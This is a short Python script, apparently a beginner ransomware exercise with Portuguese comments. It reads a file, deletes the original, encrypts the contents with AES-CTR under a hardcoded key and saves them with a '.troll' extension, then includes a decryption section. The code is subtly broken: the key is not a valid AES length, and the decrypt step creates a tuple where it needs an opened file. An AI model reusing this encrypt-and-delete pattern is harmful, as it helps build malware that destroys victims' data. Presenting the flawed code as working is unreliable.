import os
import pyaes

## Abrir o arquivo a ser criptografado

file_name = 'teste.txt'
file = open(file_name,'rb')
file_data = file.read()
file.close()

## Remover o arquivo original

os.remove(file_name)

## Definir a chave de criptografia

key = b'testeransomware'
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar o arquivo

crypto_data = aes.encrypt(file_data)

## Salva o arquivo criptografado

new_file = file_name + '.troll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

## ------------------------- Decrypt --------------------------------

## Abrir o arquivo criptografado

file_name = 'teste.txt.troll'
file = open(file_name,'rb')
file_data = file.read()
file.close()

## Chave de Descriptografia 

key = b'testeransomware'
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## Remover o arquivo criptografado

os.remove(file_name)

## Criar um novo arquivo descriptografado

new_file = 'teste.txt'
new_file = (f'{new_file}','wb')
new_file.write(decrypt_data)
new_file.close()
